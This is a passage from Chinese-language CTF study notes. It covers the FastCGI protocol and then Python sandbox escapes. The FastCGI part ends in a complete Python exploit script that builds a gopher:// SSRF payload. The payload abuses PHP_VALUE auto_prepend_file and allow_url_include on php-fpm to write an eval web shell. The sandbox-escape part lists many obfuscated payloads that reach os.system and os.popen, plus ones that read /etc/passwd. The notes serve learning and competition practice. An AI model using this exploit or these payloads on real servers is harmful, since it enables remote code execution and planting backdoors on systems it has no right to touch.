    unsigned char reserved[5];  //保留字段
}FCGI_BeginRequestBody;
```

根据上述可知type值为1的消息(标识开始请求)的消息的消息体为固定大小8字节，其中各个字段的具体含义如下

- role:此字段占2个字节，用来说明我们对php-fpm发起请求时，我们想让php-fpm为我们扮演什么角色(做什么，或理解为杂么做)，其常见的3个取值如下:![img](daydayup.assets/1689423015583-dced4942-2ec6-4ce7-acd3-c3bb75d3cada.png)
- flags:字段确定是否与php-fpm建立长连接，为1长连接，为0则在每次请求处理结束之后关闭连接
- reserved:保留字段

##### type为3

type值为3表示结束消息，其消息体的c定义如下

```c
typedef struct 
{
    unsigned char appStatusB3;      //结束状态，0为正常
    unsigned char appStatusB2;
    unsigned char appStatusB1;
    unsigned char appStatusB0;
    unsigned char protocolStatus;   //协议状态
    unsigned char reserved[3];
}FCGI_EndRequestBody;
```

同样我们可以看出结束消息体也为固定8字节大小，其各字段的具体含义如下：

- appStatus:此字段共4个字节，用来表示结束状态，0为正常结束
- protocolStatus:为协议所处的状态，0为正常状态
- reserved:为保留字节

##### type为4

此值表示此消息体为传递PARAMS(环境参数)，环境参数其实就是name-value对，我们可以使用自己定义的name-value传给php-fpm或者传递php-fpm已有的name-value对，以下为我们后面实例将会使用到的php-fpm以有的name-value对如下

![img](daydayup.assets/1689423449899-fc1b80a1-4e61-4e8a-bdc3-5addd25581ed.png)

消息体的格式如下

```c
typedef struct {
     unsigned char nameLengthB3; /* nameLengthB0 >> 7 == 0 */
     unsigned char nameLengthB2;
     unsigned char nameLengthB1;
     unsigned char nameLengthB0;
     unsigned char valueLengthB3; /* nameLengthB0 >> 7 == 0 */
     unsigned char valueLengthB2;
     unsigned char valueLengthB1;
     unsigned char valueLengthB0;
     unsigned char nameData[(B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
     unsigned char valueData[valueLength
     ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
} FCGI_NameValue;
```

以看出消息体前8个字节为固定的，其字段具体含义为

- nameLength:此字段占用4字节，用来说明name的长度
- valueLength:此字段为4个字节，用来说明value的长度

前8个字节之后紧跟的为nameLength长度的name值，接着是valueLength长度的value值

```c
typedef struct {
  unsigned char nameLengthB0;  /* nameLengthB0  >> 7 == 0 */
  unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */
  unsigned char nameData[nameLength];
  unsigned char valueData[valueLength];
} FCGI_NameValuePair11;
 
typedef struct {
  unsigned char nameLengthB0;  /* nameLengthB0  >> 7 == 0 */
  unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */
  unsigned char valueLengthB2;
  unsigned char valueLengthB1;
  unsigned char valueLengthB0;
  unsigned char nameData[nameLength];
  unsigned char valueData[valueLength
          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
} FCGI_NameValuePair14;
 
typedef struct {
  unsigned char nameLengthB3;  /* nameLengthB3  >> 7 == 1 */
  unsigned char nameLengthB2;
  unsigned char nameLengthB1;
  unsigned char nameLengthB0;
  unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */
  unsigned char nameData[nameLength
          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
  unsigned char valueData[valueLength];
} FCGI_NameValuePair41;
 
typedef struct {
  unsigned char nameLengthB3;  /* nameLengthB3  >> 7 == 1 */
  unsigned char nameLengthB2;
  unsigned char nameLengthB1;
  unsigned char nameLengthB0;
  unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */
  unsigned char valueLengthB2;
  unsigned char valueLengthB1;
  unsigned char valueLengthB0;
  unsigned char nameData[nameLength
          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
  unsigned char valueData[valueLength
          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
} FCGI_NameValuePair44;
```

这其实是4个结构，至于用哪个结构，有如下规则：

1. key、value均小于128字节，用FCGI_NameValuePair11
2. key大于128字节，value小于128字节，用FCGI_NameValuePair41
3. key小于128字节，value大于128字节，用FCGI_NameValuePair14
4. key、value均大于128字节，用FCGI_NameValuePair44

##### type值为5,6,7

当消息为输入，输出，错误时，它的消息头之后便直接跟具体数据

#### 完整消息record

![img](daydayup.assets/1689423582373-16f2051e-9c9e-49f9-a701-6710e752ae90.png)

#### PHP-FPM（FastCGI进程管理器）

FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。

FPM按照fastcgi的协议将TCP流解析成真正的数据。

举个例子，用户访问http://127.0.0.1/index.php?a=1&b=2，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：

```c
{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
}
```

这个数组其实就是PHP中$\_SERVER数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$\_SERVER数组，也是告诉fpm：“我要执行哪个PHP文件”。

PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php。

#### 任意代码执行

那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？

理论上当然是不可以的，即使我们能控制`SCRIPT_FILENAME`，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。

但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，`auto_prepend_file`和`auto_append_file`。

`auto_prepend_file`是告诉PHP，在执行目标文件之前，先包含`auto_prepend_file`中指定的文件；`auto_append_file`是告诉PHP，在执行完成目标文件后，包含`auto_append_file`指向的文件。

那么就有趣了，假设我们设置`auto_prepend_file`为`php://input`，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项`allow_url_include`）

那么，我们怎么设置`auto_prepend_file`的值？

这又涉及到PHP-FPM的两个环境变量，`PHP_VALUE`和`PHP_ADMIN_VALUE`。这两个环境变量就是用来设置PHP配置项的，`PHP_VALUE`可以设置模式为`PHP_INI_USER`和`PHP_INI_ALL`的选项，`PHP_ADMIN_VALUE`可以设置所有选项。（`disable_functions`除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）

```
{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
    'PHP_VALUE': 'auto_prepend_file = php://input',
    'PHP_ADMIN_VALUE': 'allow_url_include = On'
}
```

设置`auto_prepend_file = php://input`且`allow_url_include = On`，然后将我们需要执行的代码放在Body中，即可执行任意代码。

#### EXP

```python
import socket
import random
import argparse
import sys
from io import BytesIO
from urllib.parse import quote

# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client

PY2 = True if sys.version_info.major == 2 else False


def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])

def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)

def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')

def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s


class FastCGIClient:
    """A Fast-CGI Client for Python"""

    # private
    __FCGI_VERSION = 1

    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3

    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11

    __FCGI_HEADER_SIZE = 8

    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3

    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()

    def __connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # if self.keepalive:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
        # else:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
        try:
            self.sock.connect((self.host, int(self.port)))
        except socket.error as msg:
            self.sock.close()
            self.sock = None
            print(repr(msg))
            return False
        return True

    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
               + bchr(fcgi_type) \
               + bchr((requestid >> 8) & 0xFF) \
               + bchr(requestid & 0xFF) \
               + bchr((length >> 8) & 0xFF) \
               + bchr(length & 0xFF) \
               + bchr(0) \
               + bchr(0) \
               + content
        return buf

    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += bchr(nLen)
        else:
            record += bchr((nLen >> 24) | 0x80) \
                      + bchr((nLen >> 16) & 0xFF) \
                      + bchr((nLen >> 8) & 0xFF) \
                      + bchr(nLen & 0xFF)
        if vLen < 128:
            record += bchr(vLen)
        else:
            record += bchr((vLen >> 24) | 0x80) \
                      + bchr((vLen >> 16) & 0xFF) \
                      + bchr((vLen >> 8) & 0xFF) \
                      + bchr(vLen & 0xFF)
        return record + name + value

    def __decodeFastCGIHeader(self, stream):
        header = dict()
        header['version'] = bord(stream[0])
        header['type'] = bord(stream[1])
        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
        header['paddingLength'] = bord(stream[6])
        header['reserved'] = bord(stream[7])
        return header

    def __decodeFastCGIRecord(self, buffer):
        header = buffer.read(int(self.__FCGI_HEADER_SIZE))

        if not header:
            return False
        else:
            record = self.__decodeFastCGIHeader(header)
            record['content'] = b''
            
            if 'contentLength' in record.keys():
                contentLength = int(record['contentLength'])
                record['content'] += buffer.read(contentLength)
            if 'paddingLength' in record.keys():
                skiped = buffer.read(int(record['paddingLength']))
            return record

    def request(self, nameValuePairs={}, post=''):
        # if not self.__connect():
        #     print('connect failure! please check your fasctcgi-server !!')
        #     return

        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)

        print(f"gopher://{self.host}:{self.port}/_"+quote(quote(request)))
        # self.sock.send(request)
        # self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
        # self.requests[requestId]['response'] = b''
        # return self.__waitForResponse(requestId)

    def __waitForResponse(self, requestId):
        data = b''
        while True:
            buf = self.sock.recv(512)
            if not len(buf):
                break
            data += buf

        data = BytesIO(data)
        while True:
            response = self.__decodeFastCGIRecord(data)
            if not response:
                break
            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
                if requestId == int(response['requestId']):
                    self.requests[requestId]['response'] += response['content']
            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
                self.requests[requestId]
        return self.requests[requestId]['response']

    def __repr__(self):
        return "fastcgi connect host:{} port:{}".format(self.host, self.port)


if __name__ == '__main__':
    # parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
    # parser.add_argument('host', help='Target host, such as 127.0.0.1')
    # parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
    # parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')
    # parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)

    # args = parser.parse_args()

    client = FastCGIClient("127.0.0.1", 9000, 3, 0)
    params = dict()
    documentRoot = "/"
    uri = "/var/www/html/index.php"
    content = '''<?php file_put_contents("/var/www/html/shell.php","<?php eval(\$_POST[1]);?>");?> '''
    params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST',
        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
        'SCRIPT_NAME': uri,
        'QUERY_STRING': '',
        'REQUEST_URI': uri,
        'DOCUMENT_ROOT': documentRoot,
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '9985',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/text',
        'CONTENT_LENGTH': "%d" % len(content),
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }
    response = client.request(params, content)
    # print(force_text(response))
```

## redis漏洞复现

[SSRF---gopher和dict打redis_gopher协议打redis_Z3eyOnd的博客-CSDN博客](https://blog.csdn.net/unexpectedthing/article/details/121667613)



## CSRF



## Python沙箱逃逸

[一文看懂Python沙箱逃逸 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/203208.html)

python沙箱逃逸（pyjail），是CTF中一类题的通称：在这些题目中，我们能够交互式地用`eval`或者`exec`执行python代码。然而，执行的代码和上下文均受到一定限制，如题目用正则表达式拒绝部分字符的输入、以及令`__builtins__=None`等。在正式开始介绍pyjail题目的解法之前，让我们先复习一下python的一些特性：

- 在python中，类均继承自`object`基类；
- python中类本身具有一些静态方法，如`bytes.fromhex`、`int.from_bytes`等。对于这些类的实例，也能调用这些静态方法。如`b'1'.fromhex('1234')`，返回`b'\x124'`。（一个特殊的例子是整数常量不支持这样操作，如输入`3.from_bytes`会报错）
- python中的类还具有一系列的魔术方法，这个特性可以对比php的魔术方法，以及C++的运算符重载等。一些函数的实现也是直接调用魔术方法的。常用的魔术方法有这些，更多可参考[这里](https://www.bing.com/search?q=python魔术方法&form=ANNTH1&refig=a9a53b48d6164751abc23a6515e40220)
- 相对应地，python的类中也包含着一些魔术属性：
  - `__dict__`：可以查看内部所有属性名和属性值组成的字典。
  - `__doc__`：类的帮助文档。默认类均有帮助文档。对于自定义的类，需要我们自己实现。
- 以及还有一些重要的内置函数和变量：
  - `dir`：查看对象的所有属性和方法。在我们没有思路的时候，可以通过该函数查看所有可以利用的方法；此外，在题目禁用引号以及小数点时，也可以先用拿到类所有可用方法，再索引到方法名，并且通过`getattr`来拿到目标方法。
  - `getattr()`：用于获取对象的属性或方法。`getattr(object, name[, default])`
  - `chr`、`ord`：字符与ASCII码转换函数，能帮我们绕过一些WAF
  - `globals`：返回所有全局变量的函数；
  - `locals`：返回所有局部变量的函数；
  - `__import__`：载入模块的函数。例如`import os`等价于`os = __import__('os')`；
  - `__name__`：该变量指示当前运行环境位于哪个模块中。如我们python一般写的`if __name__ == '__main__':`，就是来判断是否是直接运行该脚本。如果是从另外的地方import的该脚本的话，那`__name__`就不为`__main__`，就不会执行之后的代码。
  - `__builtins__`：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如`str`、`chr`、`ord`、`dict`、`dir`等。在pyjail的沙箱中，往往`__builtins__`被置为`None`，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到`__builtins__`，再`__import__('os').system('sh')`进行RCE；
  - `__file__`：该变量指示当前运行代码所在路径。如`open(__file__).read()`就是读取当前运行的python文件代码。需要注意的是，**该变量仅在运行代码文件时会产生，在运行交互式终端时不会有此变量**；
  - `_`：该变量返回上一次运行的python语句结果。需要注意的是，**该变量仅在运行交互式终端时会产生，在运行代码文件时不会有此变量**。

### 花式 import

1. `import os`可以，中间的空格输入几个都可以，`import   os`

2. `__import__`：`__import__('os')`

3.  `importlib`：`importlib.import_module('os').system('ls')`

4. 也可以直接执行一遍需要导入的库进行导入

   `Python2.x`

   ```python
   execfile('/usr/lib/python2.7/os.py')
   system('ls')
   ```

   `Python2.x`和`Python3.x`通用

   ```python
   with open('/usr/lib/python3.9/os.py') as f:
       exec(f.read())
   system('ls')
   ```

   不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 `sys `没被干掉的话，还可以确认一下

   ```python
   import sys
   print(sys.path)
   ```

### 花式处理字符串

倒置，base编码，hex，字符串拼接，rot13等等，再通过利用`eval`或者`exec`

- `__import__('so'[::-1]).system('dir')`
- `eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])`
- `eval(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2Rpcicp').decode('utf-8'))`
- `eval(b'1'.fromhex('5f5f696d706f72745f5f28276f7327292e73797374656d28276469722729').decode('utf-8'))`
- `eval(bytes.fromhex('5f5f696d706f72745f5f28276f7327292e73797374656d28276469722729').decode('utf-8'))`
- `a='o';b='s';__import__(a+b).system('dir')`

### sys.modules

`sys.modules` 是一个字典，里面储存了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 `os` 是默认被加载进来的，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。

如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：

![image-20230730195551282](daydayup.assets/image-20230730195551282.png)

注意，这里不能用 `del sys.modules['os']`，因为，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。

所以删了 `sys.modules['os']` 只会让 Python 重新加载一次 os。

看到这你肯定发现了，对于上面的过滤方式，绕过的方式可以是这样：

![](daydayup.assets/image-20230730195707423.png)

### builtins、**builtin**与\_\_builtins\_\_

`builtins`，`__builtin__`与`__builtins__`的区别：首先我们知道，在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如`chr`、`open`。之所以可以这样，是因为 Python 有个叫`内建模块`（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。Python 对函数、变量、类等等的查找方式是按 `LEGB` 规则来找的，其中 B 即代表内建模块

>**LEGB 规则**
>
>Python 在查找“名称”时，是按照 LEGB 规则查找的：`Local-->Enclosed-->Global-->Built in`
>
>- Local 指的就是函数或者类的方法内部
>- Enclosed 指的是嵌套函数（一个函数包裹另一个函数，闭包）
>- Global 指的是模块中的全局变量
>- Built in 指的是 Python 为自己保留的特殊名称。
>
>如果某个 name 映射在局部(local)命名空间中没有找到，接下来就会在闭包作用域(enclosed)进行搜索，如果闭包作用域也没有找到，Python 就会到全局(global)命名空间中进行查找，最后会在内建(built-in)命名空间搜索 （如果一个名称在所有命名空间中都没有找到，就会产生一个 NameError）。
>
>```python
># 测试 LEGB
>
>str = "global"
>
>
>def outer():
>    str = "outer"
>
>    def inner():
>        # 输出inner，这里的str被注释掉之后就会输出outer，outer被注释掉之后就会输出global
>        str = "inner"
>        print(str)
>
>    inner()
>
>
>outer()
>```

###### `builtins`与`__builtin__`关系：

在Python2.X版本中，内建模块被命名为`__builtin__`，而到了Python3.X版本中，却更名为`builtins`，二者指的都是同一个东西，只是名字不同而已。

当使用内建模块中函数，变量和类等功能时，可以直接使用，不用添加内建模块的名字，也不用手动导入内建模块。但是，如果想要向内建模块修改或者添加一些功能，以便在程序其他地方使用时， 这时需要手动import。

2.x：

```
>>> import __builtin__
>>> __builtin__
<module '__builtin__' (built-in)>
```

3.x：

```
>>> import builtins
>>> builtins
<module 'builtins' (built-in)>
```

###### `__builtins__`

`__builtins__`同时存在于Python2.X和Python3.X中，简单地说，它就是对内建模块一个引用。

- `__builtins__`就是内建模块的一个引用。

- 虽然是一个引用，但`__builtins__`和内建模块是有一点区别的：

  1. 要想使用内建模块，都必须手动import内建模块，而对于`__builtins__`却不用导入，它在任何模块都直接可见， 有些情况下可以把它当作内建模块直接使用。

  2. `__builtins__`虽是对内建模块的引用，但这个引用要看是使用`__builtins__`的模块是哪个模块
     在主模块\_\_main\_\_中：
     `__builtins__`是对内建模块`__builtin__`本身的引用，即`__builtins__`完全等价于`__builtin__`，二者完全是一个东西，不分彼此。此时，`__builtins__`的类型是模块类型。

     在非\_\_main\_\_模块中：
     `__builtins__`仅是对`__builtin__.__dict__`的引用，而非`__builtin__`本身。它在任何地方都可见。此时`__builtins__`的类型是字典。

     [具体效果可以查看该demo](./demo/SSTIdemo/SSTIclassdemo.py)
     ![image-20230730213006283](daydayup.assets/image-20230730213006283.png)

###### 利用

不管怎么样，`__builtins__` 相对实用一点，并且在 `__builtins__`里有很多好东西：

```python
>>> '__import__' in dir(__builtins__)
True
>>> 'eval' in dir(__builtins__)
True
>>> 'exec' in dir(__builtins__)
True
>>> 'open' in dir(__builtins__)
True
```

![image-20230730213426132](daydayup.assets/image-20230730213426132.png)

```
>>> __builtins__.__dict__['eval']("print('aabbccd')")
aabbccd
>>> __builtins__.exec("import os\nos.system('dir')")
 驱动器 C 中的卷是 Windows-SSD
 卷的序列号是 DC5D-17E8

 C:\Users\Lenovo 的目录
```

![image-20230730214127681](daydayup.assets/image-20230730214127681.png)

那么既然`__builtins__`有这么多危险的函数，不如将里面的危险函数破坏了：

```
__builtins__.__dict__['eval'] = 'not allowed'
```

或者直接删了：

```
del __builtins__.__dict__['eval']
```

但是我们可以利用 `reload(__builtins__)` 来恢复 `__builtins__`。不过，我们在使用 `reload` 的时候也没导入，说明`reload`也在 `__builtins__`里，那如果连`reload`都从`__builtins__`中删了，就没法恢复`__builtins__`了，需要另寻他法。

3.8 3.9 经测试已经无法恢复，2.7 可以
![image-20230730224716559](daydayup.assets/image-20230730224716559.png)
![image-20230730224826870](daydayup.assets/image-20230730224826870.png)

这里注意，在 Python 3.4 之前的版本中，`reload()` 函数是一个内置函数，3.4之后需要 `import imp`，然后再 `imp.reload`，从 Python 3.4 之后，建议使用 `importlib` 模块中的 `importlib.reload()` 函数来重新加载模块，因为 `imp` 模块在未来的版本中可能会被移除。

### 花式执行函数

在 Python 中执行系统命令的方式有：

```
os
commands：仅限2.x
subprocess
timeit：timeit.sys、timeit.timeit("__import__('os').system('whoami')", number=1)
platform：platform.os、platform.sys、platform.popen('whoami', mode='r', bufsize=-1).read()
pty：pty.spawn('ls')、pty.os
bdb：bdb.os、cgi.sys
cgi：cgi.os、cgi.sys
...
```

通过上面内容我们很容易发现，光引入`os`只不过是第一步，如果把`system`这个函数干掉，也没法通过`os.system`执行系统命令，并且这里的`system`也不是字符串，也没法直接做编码等等操作。

不过，要明确的是，os 中能够执行系统命令的函数有很多：

```
print(os.system('whoami'))
print(os.popen('whoami').read()) 
print(os.popen2('whoami').read()) # 2.x
print(os.popen3('whoami').read()) # 2.x
print(os.popen4('whoami').read()) # 2.x
...
```

应该还有一些，可以在这里找找：

[2.x 传送门](https://docs.python.org/2/library/os.html)

[3.x 传送门](https://docs.python.org/3/library/os.html)

过滤`system`的时候说不定还有其他函数给漏了。

其次，可以通过 `getattr` 拿到对象的方法、属性：

```
import os
getattr(os, 'metsys'[::-1])('whoami')
```

不让出现 import也没事：

```
>>> getattr(getattr(__builtins__, '__tropmi__'[::-1])('so'[::-1]), 'metsys'[::-1])('whoami')
desktop-13qds1a\lenovo
0
```

与 `getattr` 相似的还有 `__getattr__`、`__getattribute__`，它们自己的区别就是`getattr`相当于`class.attr`，都是获取类属性/方法的一种方式，在获取的时候会触发`__getattribute__`，如果`__getattribute__`找不到，则触发`__getattr__`，还找不到则报错。更具体的这里就不解释了，下面有。

### 通过继承关系逃逸

*[这里](#Python中的一些 Magic Method)

>因为python3和python2两个版本下有差别，这里把python2单独拿出来说
>
>tips：python2的`string`类型不直接从属于属于基类，所以要用两次 `__bases__[0]`
>
>![img](daydayup.assets/format,png.png)
>
>- `file`类读写文件
>
>本方法只能适用于python2，因为在python3中`file`类已经被移除了
>
>可以使用dir查看file对象中的内置方法
>
>```
>>>> dir(().__class__.__bases__[0].__subclasses__()[40])
>['__class__', '__delattr__', '__doc__', '__enter__', '__exit__', '__format__', '__getattribute__', '__hash__', '__init__', '__iter__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'close', 'closed', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'mode', 'name', 'newlines', 'next', 'read', 'readinto', 'readline', 'readlines', 'seek', 'softspace', 'tell', 'truncate', 'write', 'writelines', 'xreadlines']
>```
>
>读文件
>
>```
>{{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}
> 
>{{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()}}
>```
>
>- warnings类中的linecache
>
>
>本方法只能用于python2，因为在python3中会报错'function object' has no attribute 'func_globals'，python3中func_globals被移除了
>
>```
># 含有linecache的类
>(<class 'warnings.WarningMessage'>, 59)
>(<class 'warnings.catch_warnings'>, 60)
>```
>
>payload：`{{[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].os.popen('whoami').read()}}`

```
>>> for i in enumerate(''.__class__.__base__.__subclasses__()): print(i)
```

Python 中有个属性，`.__mro__` 或 `.mro()`，是个元组，记录了继承关系：

```
>>> '1'.__class__.mro()
[<class 'str'>, <class 'object'>]
>>> '1'.__class__.__mro__
(<class 'str'>, <class 'object'>)
```

类的实例在获取 `__class__` 属性时会指向该实例对应的类。可以看到，`''`属于 `str`类，它继承了 `object` 类，这个类是所有类的超类。具有相同功能的还有`__base__`和`__bases__`。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的（Python 3.9 测试无需指明）

那么知道这个有什么用呢？

由于没法直接引入 os，那么假如有个库叫`oos`，在`oos`中引入了`os`，那么我们就可以通过`__globals__`拿到 `os`。例如，`site` 这个库就有 `os`：

```
>>> __import__('site').os
<module 'os' from 'C:\\Users\\Lenovo\\AppData\\Local\\Programs\\Python\\Python39\\lib\\os.py'>
```

`__globals__` 是函数所在的全局命名空间中所定义的全局变量。也就是只要是函数就会有这个属性。注意，`__globals__`调用的是当前全局命名空间中的变量，不是类中的变量
![image-20230731165649323](daydayup.assets/image-20230731165649323.png)

>1. `builtin_function_or_method` 类型函数：
>   - `builtin_function_or_method` 是 Python 中内置函数（built-in functions）的类型，这些函数是 Python 解释器内置的一些常用功能函数，例如 `print()`、`len()`、`range()` 等。
>2. `wrapper_descriptor` 类型函数：
>   - `wrapper_descriptor` 是 Python 中的描述符（descriptor）类型，它是用于实现特定属性访问逻辑的一种对象。通常，它是由类的特殊方法（如 `__get__()`、`__set__()` 等）定义的。
>3. `method-wrapper` 类型函数：
>   - `method-wrapper` 是 Python 中包装（wrapper）方法的类型。当类的方法被调用时，Python 会自动创建一个 `method-wrapper` 对象来包装该方法，从而提供额外的功能或处理。
>4. `method_descriptor`:
>   - 表示 Python 内置方法（built-in methods）的类对象。注意，不是实例，个人理解为是内建函数的类，将其实例化后成为内建函数`builtin_function_or_method` 类型函数
>   - 这些内置方法是针对不同类型的内置对象提供的方法，可以在对应的对象上直接调用。
>   - 内置方法与特定的数据类型相关，比如字符串类型的方法 `str.upper()`、`str.lower()`，列表类型的方法 `list.append()`、`list.pop()`，字典类型的方法 `dict.get()`、`dict.keys()` 等。
>
>```
>>>> ''.strip
><built-in method strip of str object at 0x000001A4174D4670>
>
>```
>
>关于`method_descriptor`:
>
>原理：
>
>```reasonml
>class C:
>    def method(self, arg):
>        print "In C.method, with", arg
>
>o = C()
>o.method(1)
>C.method(o, 1)
># Prints:
># In C.method, with 1
